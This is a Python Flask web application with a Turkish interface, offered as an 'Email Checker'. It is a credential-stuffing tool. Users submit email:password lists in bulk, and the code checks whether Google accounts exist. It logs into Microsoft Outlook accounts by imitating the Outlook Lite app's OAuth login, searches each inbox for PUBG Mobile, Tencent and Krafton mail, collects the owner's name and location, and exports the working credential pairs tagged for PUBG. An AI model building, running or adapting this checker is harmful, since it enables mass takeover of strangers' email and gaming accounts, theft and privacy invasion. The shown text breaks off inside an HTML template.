import os
import re
import json
import time
import uuid
import secrets
import hashlib
import concurrent.futures
from datetime import datetime, timedelta
from functools import wraps
from io import BytesIO

import requests
from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for, send_file
from werkzeug.security import generate_password_hash, check_password_hash
from email_validator import validate_email, EmailNotValidError
import dns.resolver

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.permanent_session_lifetime = timedelta(days=7)

# ==================== KONFIGURASYON ====================
CONFIG = {
    "max_workers": 30,
    "timeout": 15,
    "retry_count": 2,
    "max_emails_per_check": 100,
}

# ==================== PUBG TARGET SENDERS ====================
PUBG_SENDERS = [
    "noreply@pubgmobile.com",
    "no-reply@pubgmobile.com",
    "pubgmobile@news.pubg.com",
    "pubgmobile@info.pubg.com",
    "pubgmobile@promotions.pubg.com",
    "pubgmobile@events.pubg.com",
    "tencentgames.com",
    "levelinfinite.com",
    "krafton.com"
]

# ==================== KULLANICI VERİTABANI ====================
USERS_FILE = "users.json"
DATA_DIR = "user_data"

def init_data_dir():
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR)

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def get_user_data(username):
    file_path = os.path.join(DATA_DIR, f"{username}_emails.json")
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"emails": [], "stats": {"total": 0, "valid": 0, "invalid": 0, "pubg": 0}}

def save_user_data(username, data):
    file_path = os.path.join(DATA_DIR, f"{username}_emails.json")
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

# ==================== DEKORATÖRLER ====================
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ==================== PUBG MOBILE CHECKER API ====================
class PUBGMobileChecker:
    """PUBG Mobile Email Checker - Microsoft Outlook üzerinden"""
    
    TARGET_SENDERS = PUBG_SENDERS

    @staticmethod
    def check_pubg_emails(email, password, token, cid):
        """PUBG Mobile maillerini kontrol et"""
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        try:
            # Profil bilgilerini al
            profile_res = requests.get(
                "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                headers=headers,
                timeout=10
            ).json()
            
            info_name = profile_res.get('names', [])
            info_loca = profile_res.get('accounts', [])
            name = info_name[0]['displayName'] if info_name else "Bilinmiyor"
            location = info_loca[0]['location'] if info_loca else "Bilinmiyor"

            # Mail listesini al
            url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
            mail_headers = {
                "Host": "outlook.live.com",
                "content-length": "0",
                "x-owa-sessionid": f"{cid}",
                "x-req-source": "Mini",
                "authorization": f"Bearer {token}",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
                "action": "StartupData",
                "x-owa-correlationid": f"{cid}",
                "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
                "content-type": "application/json; charset=utf-8",
                "accept": "*/*",
                "origin": "https://outlook.live.com",
                "x-requested-with": "com.microsoft.outlooklite",
                "referer": "https://outlook.live.com/",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9"
            }
            
            response = requests.post(url, headers=mail_headers, data="", timeout=10)
            mail_text = response.text

            # PUBG maillerini say
            domain_counts = {}
            total_count = 0
            for sender in PUBGMobileChecker.TARGET_SENDERS:
                count = mail_text.count(sender)
                if count > 0:
                    domain_counts[sender] = count
                    total_count += count

            return {
                "is_pubg": total_count > 0,
                "total_pubg_mails": total_count,
                "domain_counts": domain_counts,
                "name": name,
                "location": location,
                "email": email,
                "password": password
            }
            
        except Exception as e:
            return {
                "is_pubg": False,
                "error": str(e),
                "email": email,
                "password": password
            }

    @staticmethod
    def get_token(email, password, cookies, headers):
        """Microsoft token al"""
        try:
            code = headers.get('Location', '').split('code=')[1].split('&')[0]
            cid = cookies.get('MSPCID', '').upper()
            
            token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
            token_data = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            
            token_res = requests.post(token_url, data=token_data, timeout=10)
            token = token_res.json().get("access_token")
            
            if token:
                return PUBGMobileChecker.check_pubg_emails(email, password, token, cid)
            return None
            
        except Exception as e:
            return {"error": str(e), "email": email, "password": password}

    @staticmethod
    def login_protocol(email, password, url, ppft, ad, mspreq, uaid, refresh_token_sso, mspok, oparams):
        """Microsoft login protocol"""
        try:
            payload = (
                f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition="
                f"&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy="
                f"&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1"
                f"&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0"
                f"&isRecoveryAttemptPost=0&i19=9960"
            )
            
            headers = {
                "Host": "login.live.com",
                "Connection": "keep-alive",
                "Content-Length": str(len(payload)),
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "Origin": "https://login.live.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
                "X-Requested-With": "com.microsoft.outlooklite",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": f"{ad}haschrome=1",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Cookie": (
                    f"MSPRequ={mspreq};uaid={uaid}; RefreshTokenSso={refresh_token_sso}; "
                    f"MSPOK={mspok}; OParams={oparams}; MicrosoftApplicationsTelemetryDeviceId={str(uuid.uuid4())}"
                )
            }
            
            response = requests.post(url, data=payload, headers=headers, allow_redirects=False, timeout=10)
            cookies = response.cookies.get_dict()
            resp_headers = response.headers
            
            if any(key in cookies for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or response.text == '':
                return PUBGMobileChecker.get_token(email, password, cookies, resp_headers)
            else:
                return {"error": "Geçersiz giriş", "email": email, "password": password}
                
        except Exception as e:
            return {"error": str(e), "email": email, "password": password}

    @staticmethod
    def get_values(email, password):
        """Email ve şifre ile PUBG kontrolü başlat"""
        try:
            headers = {
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
                "return-client-request-id": "false",
                "client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738",
                "x-ms-sso-ignore-sso": "1",
                "correlation-id": str(uuid.uuid4()),
                "x-client-ver": "1.1.0+9e54a0d1",
                "x-client-os": "28",
                "x-client-sku": "MSAL.xplat.android",
                "x-client-src-sku": "MSAL.xplat.android",
                "X-Requested-With": "com.microsoft.outlooklite",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
            }
            
            auth_url = (
                f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
                f"client_info=1&haschrome=1&login_hint={email}"
                f"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            )
            
            response = requests.get(auth_url, headers=headers, timeout=10)
            cookies = response.cookies.get_dict()
            
            # Değerleri çıkar
            url_post = response.text.split("urlPost:'")[1].split("'")[0]
            ppft = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
            ad = response.url.split('haschrome=1')[0]
            
            mspreq = cookies.get('MSPRequ', '')
            uaid = cookies.get('uaid', '')
            refresh_token_sso = cookies.get('RefreshTokenSso', '')
            mspok = cookies.get('MSPOK', '')
            oparams = cookies.get('OParams', '')
            
            return PUBGMobileChecker.login_protocol(
                email, password, url_post, ppft, ad, mspreq, uaid,
                refresh_token_sso, mspok, oparams
            )
            
        except Exception as e:
            return {"error": str(e), "email": email, "password": password}

    @staticmethod
    def check_account(email, password):
        """PUBG hesap kontrolü - ana metod"""
        try:
            result = PUBGMobileChecker.get_values(email, password)
            if result and isinstance(result, dict):
                return result
            return {"error": "Kontrol başarısız", "email": email, "password": password}
        except Exception as e:
            return {"error": str(e), "email": email, "password": password}

# ==================== EMAIL KONTROL FONKSİYONLARI ====================

def check_google_account(email):
    """Google hesabı kontrolü"""
    try:
        url = "https://accounts.google.com/_/signin/sl/lookup"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://accounts.google.com",
            "Referer": "https://accounts.google.com/"
        }
        data = {"Email": email, "continue": "https://accounts.google.com/"}
        
        response = requests.post(url, data=data, headers=headers, timeout=10, allow_redirects=False)
        text = response.text.lower()
        
        if "password" in text or "şifre" in text:
            return True, "Google hesabı mevcut"
        elif "couldn't find" in text or "bulunamadı" in text:
            return False, "Google hesabı yok"
        else:
            return True, "Google hesabı mevcut"
    except:
        return None, "Google kontrolü başarısız"

def check_email_comprehensive(email, password=None):
    """Kapsamlı email + PUBG kontrolü"""
    result = {
        "email": email,
        "password": password,
        "valid": False,
        "is_pubg": False,
        "checked_at": datetime.now().isoformat(),
        "checks": {},
        "pubg_details": None
    }
    
    # 1. Google hesap kontrolü
    google_valid, google_msg = check_google_account(email)
    result["checks"]["google"] = {"valid": google_valid, "message": google_msg}
    
    if google_valid:
        result["valid"] = True
        
        # 2. Eğer şifre varsa PUBG kontrolü yap
        if password:
            pubg_result = PUBGMobileChecker.check_account(email, password)
            if pubg_result and pubg_result.get('is_pubg'):
                result["is_pubg"] = True
                result["pubg_details"] = {
                    "total_pubg_mails": pubg_result.get('total_pubg_mails', 0),
                    "domain_counts": pubg_result.get('domain_counts', {}),
                    "name": pubg_result.get('name', 'Bilinmiyor'),
                    "location": pubg_result.get('location', 'Bilinmiyor')
                }
                result["checks"]["pubg"] = {
                    "valid": True,
                    "message": f"PUBG Mobile hesabı bulundu! {pubg_result.get('total_pubg_mails', 0)} PUBG maili"
                }
            else:
                result["checks"]["pubg"] = {
                    "valid": False,
                    "message": "PUBG Mobile maili bulunamadı"
                }
    
    return result

# ==================== ROUTES ====================

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return render_template_string(LOGIN_HTML)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        email = request.form.get('email', '').strip()
        password = request.form.get('password', '')
        confirm = request.form.get('confirm_password', '')
        
        if not username or not email or not password:
            return render_template_string(REGISTER_HTML, error="Tüm alanlar zorunlu")
        
        if password != confirm:
            return render_template_string(REGISTER_HTML, error="Şifreler eşleşmiyor")
        
        if len(password) < 6:
            return render_template_string(REGISTER_HTML, error="Şifre en az 6 karakter")
        
        users = load_users()
        if username in users:
            return render_template_string(REGISTER_HTML, error="Kullanıcı adı alınmış")
        
        for u in users.values():
            if u.get('email') == email:
                return render_template_string(REGISTER_HTML, error="Email zaten kayıtlı")
        
        users[username] = {
            "username": username,
            "email": email,
            "password": generate_password_hash(password),
            "created_at": datetime.now().isoformat(),
            "last_login": None,
            "email_count": 0,
            "valid_count": 0,
            "pubg_count": 0
        }
        save_users(users)
        init_data_dir()
        return redirect(url_for('login'))
    
    return render_template_string(REGISTER_HTML)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        
        users = load_users()
        if username not in users:
            return render_template_string(LOGIN_HTML, error="Kullanıcı adı veya şifre hatalı")
        
        if not check_password_hash(users[username]['password'], password):
            return render_template_string(LOGIN_HTML, error="Kullanıcı adı veya şifre hatalı")
        
        session['user_id'] = username
        session.permanent = True
        users[username]['last_login'] = datetime.now().isoformat()
        save_users(users)
        return redirect(url_for('dashboard'))
    
    return render_template_string(LOGIN_HTML)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/forgot-password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        users = load_users()
        
        found = None
        for username, data in users.items():
            if data.get('email') == email:
                found = username
                break
        
        if not found:
            return render_template_string(FORGOT_HTML, error="Email bulunamadı")
        
        new_password = secrets.token_hex(4)
        users[found]['password'] = generate_password_hash(new_password)
        save_users(users)
        
        return render_template_string(FORGOT_HTML, 
            success=f"Yeni şifre: {new_password}\nGiriş yapıp değiştirin.")
    
    return render_template_string(FORGOT_HTML)

@app.route('/dashboard')
@login_required
def dashboard():
    username = session['user_id']
    users = load_users()
    user_data = users.get(username, {})
    user_emails = get_user_data(username)
    
    return render_template_string(DASHBOARD_HTML,
        username=username,
        user=user_data,
        emails=user_emails,
        stats=user_emails.get('stats', {})
    )

@app.route('/profile', methods=['GET', 'POST'])
@login_required
def profile():
    username = session['user_id']
    users = load_users()
    user = users.get(username, {})
    
    if request.method == 'POST':
        current = request.form.get('current_password', '')
        new_pass = request.form.get('new_password', '')
        confirm = request.form.get('confirm_password', '')
        
        if not check_password_hash(user['password'], current):
            return render_template_string(PROFILE_HTML, user=user, error="Mevcut şifre hatalı")
        
        if new_pass and new_pass == confirm:
            if len(new_pass) >= 6:
                users[username]['password'] = generate_password_hash(new_pass)
                save_users(users)
                return render_template_string(PROFILE_HTML, user=user, success="Şifre değiştirildi")
            else:
                return render_template_string(PROFILE_HTML, user=user, error="Şifre en az 6 karakter")
        elif new_pass:
            return render_template_string(PROFILE_HTML, user=user, error="Şifreler eşleşmiyor")
    
    return render_template_string(PROFILE_HTML, user=user)

# ==================== API ROUTES ====================

@app.route('/api/check', methods=['POST'])
@login_required
def api_check_email():
    """Email kontrol et (Google + PUBG)"""
    try:
        data = request.get_json()
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        
        if not email:
            return jsonify({"error": "Email gerekli"}), 400
        
        # Kapsamlı kontrol
        result = check_email_comprehensive(email, password if password else None)
        
        # Kullanıcı verilerini güncelle
        username = session['user_id']
        user_emails = get_user_data(username)
        
        user_emails['emails'].append(result)
        user_emails['stats']['total'] += 1
        if result['valid']:
            user_emails['stats']['valid'] += 1
        if result.get('is_pubg'):
            user_emails['stats']['pubg'] = user_emails['stats'].get('pubg', 0) + 1
        
        save_user_data(username, user_emails)
        
        # Kullanıcı istatistiklerini güncelle
        users = load_users()
        if username in users:
            users[username]['email_count'] = user_emails['stats']['total']
            users[username]['valid_count'] = user_emails['stats']['valid']
            users[username]['pubg_count'] = user_emails['stats'].get('pubg', 0)
            save_users(users)
        
        return jsonify({"success": True, "result": result})
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/check-bulk', methods=['POST'])
@login_required
def api_check_bulk():
    """Toplu email kontrolü"""
    try:
        data = request.get_json()
        items = data.get('items', [])
        
        if not items:
            return jsonify({"error": "Email listesi gerekli"}), 400
        
        if len(items) > CONFIG['max_emails_per_check']:
            return jsonify({"error": f"Maksimum {CONFIG['max_emails_per_check']} email"}), 400
        
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for item in items:
                email = item.get('email', '').strip()
                password = item.get('password', '').strip()
                if email:
                    futures.append(executor.submit(check_email_comprehensive, email, password if password else None))
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result(timeout=30)
                    results.append(result)
                except Exception as e:
                    results.append({"error": str(e)})
        
        # Kullanıcı verilerini güncelle
        username = session['user_id']
        user_emails = get_user_data(username)
        
        for result in results:
            if isinstance(result, dict) and 'email' in result:
                user_emails['emails'].append(result)
                user_emails['stats']['total'] += 1
                if result.get('valid'):
                    user_emails['stats']['valid'] += 1
                if result.get('is_pubg'):
                    user_emails['stats']['pubg'] = user_emails['stats'].get('pubg', 0) + 1
        
        save_user_data(username, user_emails)
        
        # Kullanıcı istatistiklerini güncelle
        users = load_users()
        if username in users:
            users[username]['email_count'] = user_emails['stats']['total']
            users[username]['valid_count'] = user_emails['stats']['valid']
            users[username]['pubg_count'] = user_emails['stats'].get('pubg', 0)
            save_users(users)
        
        valid_count = sum(1 for r in results if isinstance(r, dict) and r.get('valid'))
        pubg_count = sum(1 for r in results if isinstance(r, dict) and r.get('is_pubg'))
        
        return jsonify({
            "success": True,
            "total": len(results),
            "valid_count": valid_count,
            "pubg_count": pubg_count,
            "results": results
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/export', methods=['GET'])
@login_required
def api_export():
    """Geçerli emailleri dışa aktar"""
    username = session['user_id']
    user_emails = get_user_data(username)
    
    valid_emails = []
    for e in user_emails['emails']:
        if e.get('valid'):
            line = e['email']
            if e.get('password'):
                line += f":{e['password']}"
            if e.get('is_pubg'):
                line += " [PUBG]"
            valid_emails.append(line)
    
    if not valid_emails:
        return jsonify({"error": "Geçerli email bulunamadı"}), 404
    
    content = "\n".join(valid_emails)
    return send_file(
        BytesIO(content.encode('utf-8')),
        mimetype='text/plain',
        as_attachment=True,
        download_name=f"{username}_valid_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"
    )

@app.route('/api/export-pubg', methods=['GET'])
@login_required
def api_export_pubg():
    """PUBG emaillerini dışa aktar"""
    username = session['user_id']
    user_emails = get_user_data(username)
    
    pubg_emails = []
    for e in user_emails['emails']:
        if e.get('is_pubg'):
            line = f"{e['email']}:{e.get('password', 'BULUNAMADI')}"
            if e.get('pubg_details'):
                line += f" | PUBG Mail: {e['pubg_details'].get('total_pubg_mails', 0)}"
            pubg_emails.append(line)
    
    if not pubg_emails:
        return jsonify({"error": "PUBG email bulunamadı"}), 404
    
    content = "\n".join(pubg_emails)
    return send_file(
        BytesIO(content.encode('utf-8')),
        mimetype='text/plain',
        as_attachment=True,
        download_name=f"{username}_pubg_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"
    )

@app.route('/api/stats', methods=['GET'])
@login_required
def api_stats():
    username = session['user_id']
    user_emails = get_user_data(username)
    
    return jsonify({
        "username": username,
        "stats": user_emails.get('stats', {}),
        "recent": user_emails['emails'][-10:] if user_emails['emails'] else []
    })

@app.route('/api/clear-data', methods=['POST'])
@login_required
def api_clear_data():
    username = session['user_id']
    empty_data = {"emails": [], "stats": {"total": 0, "valid": 0, "invalid": 0, "pubg": 0}}
    save_user_data(username, empty_data)
    
    users = load_users()
    if username in users:
        users[username]['email_count'] = 0
        users[username]['valid_count'] = 0
        users[username]['pubg_count'] = 0
        save_users(users)
    
    return jsonify({"success": True})

@app.route('/api/delete-email', methods=['POST'])
@login_required
def api_delete_email():
    try:
        data = request.get_json()
        email = data.get('email', '').strip()
        
        username = session['user_id']
        user_emails = get_user_data(username)
        
        user_emails['emails'] = [e for e in user_emails['emails'] if e.get('email') != email]
        
        # İstatistikleri yeniden hesapla
        stats = {"total": 0, "valid": 0, "invalid": 0, "pubg": 0}
        for e in user_emails['emails']:
            stats['total'] += 1
            if e.get('valid'):
                stats['valid'] += 1
            else:
                stats['invalid'] += 1
            if e.get('is_pubg'):
                stats['pubg'] += 1
        
        user_emails['stats'] = stats
        save_user_data(username, user_emails)
        
        return jsonify({"success": True})
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ==================== HTML TEMPLATES ====================

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 Giriş - Email Checker</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0a; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .login-box { background: #1a1a1a; padding: 40px; border-radius: 16px; border: 1px solid #333; max-width: 400px; width: 100%; }
        .login-box h1 { text-align: center; font-size: 32px; background: linear-gradient(135deg, #ffd700, #ff6b00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 30px; }
        .form-group { margin: 15px 0; }
        .form-group label { color: #888; display: block; margin-bottom: 5px; font-size: 14px; }
        .form-group input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #333; background: #0a0a0a; color: #fff; font-size: 14px; }
        .form-group input:focus { outline: none; border-color: #ffd700; }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; background: linear-gradient(135deg, #ffd700, #ff6b00); color: #000; transition: 0.3s; }
        .btn:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(255, 215, 0, 0.3); }
        .error { color: #ff0044; text-align: center; margin: 10px 0; }
        .success { color: #00ff88; text-align: center; margin: 10px 0; }
        .links { text-align: center; margin-top: 15px; }
        .links a { color: #888; text-decoration: none; margin: 0 10px; font-size: 14px; }
        .links a:hover { color: #ffd700; }
        .footer { text-align: center; margin-top: 20px; color: #555; }
        .footer a { color: #ffd700; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>🎯 Email Checker</h1>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <div class="form-group"><label>👤 Kullanıcı Adı</label><input type="text" name="username" required></div>
            <div class="form-group"><label>🔑 Şifre</label><input type="password" name="password" required></div>
            <button type="submit" class="btn">🚀 Giriş Yap</button>
        </form>
        <div class="links"><a href="/register">Kayıt Ol</a> <a href="/forgot-password">Şifremi Unuttum</a></div>
        <div class="footer">📞✈️ <a href="https://t.me/rinexdestek" target="_blank">@rinexdestek</a></div>
    </div>
</body>
</html>
"""

REGISTER_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📝 Kayıt Ol</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0a; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .register-box { background: #1a1a1a; padding: 40px; border-radius: 16px; border: 1px solid #333; max-width: 400px; width: 100%; }
        .register-box h1 { text-align: center; font-size: 32px; background: linear-gradient(135deg, #ffd700, #ff6b00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 30px; }
        .form-group { margin: 15px 0; }
        .form-group label { color: #888; display: block; margin-bottom: 5px; font-size: 14px; }
        .form-group input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #333; background: #0a0a0a; color: #fff; font-size: 14px; }
        .form-group input:focus { outline: none; border-color: #ffd700; }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; background: linear-gradient(135deg, #ffd700, #ff6b00); color: #000; transition: 0.3s; }
        .btn:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(255, 215, 0, 0.3); }
        .error { color: #ff0044; text-align: center; margin: 10px 0; }
        .links { text-align: center; margin-top: 15px; }
        .links a { color: #888; text-decoration: none; }
        .links a:hover { color: #ffd700; }
    </style>
</head>
<body>
    <div class="register-box">
        <h1>📝 Kayıt Ol</h1>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <div class="form-group"><label>👤 Kullanıcı Adı</label><input type="text" name="username" required></div>
            <div class="form-group"><label>📧 Email</label><input type="email" name="email" required></div>
            <div class="form-group"><label>🔑 Şifre</label><input type="password" name="password" required minlength="6"></div>
            <div class="form-group"><label>🔑 Şifre Tekrar</label><input type="password" name="confirm_password" required></div>
            <button type="submit" class="btn">✅ Kayıt Ol</button>
        </form>
        <div class="links"><a href="/login">Zaten hesabın var mı? Giriş Yap</a></div>
    </div>
</body>
</html>
"""

FORGOT_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔑 Şifre Sıfırlama</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0a; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .box { background: #1a1a1a; padding: 40px; border-radius: 16px; border: 1px solid #333; max-width: 400px; width: 100%; }
        .box h1 { text-align: center; font-size: 28px; color: #ffd700; margin-bottom: 30px; }
        .form-group { margin: 15px 0; }
        .form-group label { color: #888; display: block; margin-bottom: 5px; }
        .form-group input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #333; background: #0a0a0a; color: #fff; font-size: 14px; }
        .form-group input:focus { outline: none; border-color: #ffd700; }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; background: linear-gradient(135deg, #ffd700, #ff6b00); color: #000; transition: 0.3s; }
        .btn:hover { transform: scale(1.02); }
        .error { color: #ff0044; text-align: center; margin: 10px 0; }
        .success { color: #00ff88; text-align: center; margin: 10px 0; white-space: pre-wrap; }
        .links { text-align: center; margin-top: 15px; }
        .links a { color: #888; text-decoration: none; }
        .links a:hover { color: #ffd700; }
    </style>
</head>
<body>
    <div class="box">
        <h1>🔑 Şifre Sıfırlama</h1>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        {% if success %}<div class="success">{{ success }}</div>{% endif %}
        <form method="POST">
            <div class="form-group"><label>📧 Kayıtlı Email</label><input type="email" name="email" required></div>
            <button type="submit" class="btn">🔄 Şifreyi Sıfırla</button>
        </form>
        <div class="links"><a href="/login">← Giriş Sayfasına Dön</a></div>
    </div>
</body>
</html>
"""

PROFILE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>👤 Profil</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0a; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .profile-box { background: #1a1a1a; padding: 40px; border-radius: 16px; border: 1px solid #333; max-width: 450px; width: 100%; }
        .profile-box h1 { text-align: center; font-size: 32px; background: linear-gradient(135deg, #ffd700, #ff6b00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }
        .username { text-align: center; color: #888; margin-bottom: 30px; }
        .stats { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin: 20px 0; }
        .stat { background: #0a0a0a; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; }
        .stat .num { font-size: 24px; font-weight: bold; color: #ffd700; }
        .stat .num.green { color: #00ff88; }
        .stat .num.pubg { color: #ff6b00; }
        .stat .label { color: #888; font-size: 12px; }
        .form-group { margin: 15px 0; }
        .form-group label { color: #888; display: block; margin-bottom: 5px; }
        .form-group input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #333; background: #0a0a0a; color: #fff; font-size: 14px; }
        .form-group input:focus { outline: none; border-color: #ffd700; }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; background: linear-gradient(135deg, #ffd700, #ff6b00); color: #000; transition: 0.3s; margin: 5px 0; }
        .btn:hover { transform: scale(1.02); }
        .error { color: #ff0044; text-align: center; margin: 10px 0; }
        .success { color: #00ff88; text-align: center; margin: 10px 0; }
        .links { text-align: center; margin-top: 20px; }
        .links a { color: #888; text-decoration: none; margin: 0 10px; }
        .links a:hover { color: #ffd700; }
    </style>
</head>
<body>
    <div class="profile-box">
        <h1>👤 Profil</h1>
        <div class="username">@{{ user.username }}</div>
        <div class="stats">
            <div class="stat"><div class="num">{{ user.email_count|default(0) }}</div><div class="label">📊 Toplam</div></div>
            <div class="stat"><div class="num green">{{ user.valid_count|default(0) }}</div><div class="label">✅ Geçerli</div></div>
            <div class="stat"><div class="num pubg">{{ user.pubg_count|default(0) }}</div><div class="label">🎯 PUBG</div></div>
        </div>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        {% if success %}<div class="success">{{ success }}</div>{% endif %}
        <form method="POST">
            <div class="form-group"><label>🔑 Mevcut Şifre</label><input type="password" name="current_password" required></div>
            <div class="form-group"><label>🔑 Yeni Şifre</label><input type="password" name="new_password" minlength="6"></div>
            <div class="form-group"><label>🔑 Yeni Şifre Tekrar</label><input type="password" name="confirm_password"></div>
            <button type="submit" class="btn">💾 Şifreyi Değiştir</button>
        </form>
        <div class="links"><a href="/dashboard">📊 Dashboard</a> <a href="/logout">🚪 Çıkış</a></div>
